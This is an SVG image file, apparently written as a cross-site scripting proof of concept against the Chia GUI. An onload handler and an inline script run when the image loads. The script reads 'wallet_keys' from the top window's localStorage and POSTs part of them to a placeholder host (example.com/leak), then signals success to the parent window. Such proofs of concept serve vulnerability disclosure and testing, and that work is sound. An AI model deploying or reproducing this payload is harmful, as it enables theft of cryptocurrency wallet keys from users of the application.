<?xml version="1.0" encoding="UTF-8"?>
<!-- XSS PoC SVG for Chia GUI -->
<svg xmlns="http://www.w3.org/2000/svg"
     width="100" height="100"
     onload="alert('Chia GUI XSS PoC – SVG loaded');">

  <!-- Visible content -->
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="55" fill="white" font-size="12">PWNED</text>

  <!-- Inline payload -->
  <script type="application/ecmascript"><![CDATA[
    alert('Chia GUI XSS PoC – inline script running');
    console.log('localStorage keys →', Object.keys(window.top.localStorage || {}));

    /* Try to exfiltrate first 100 bytes of wallet keys (if present) */
    try {
      const keys = window.top.localStorage.getItem('wallet_keys');
      if (keys) {
        fetch('https://example.com/leak', {
          method: 'POST',
          mode: 'no-cors',
          body: keys.slice(0, 100)
        });
      }
    } catch (e) {
      console.log('localStorage access blocked:', e);
    }

    /* Signal success */
    window.top.postMessage(
      { source: 'chia_nft_svg', type: 'xss_confirmed' },
      '*'
    );
  ]]></script>
</svg>
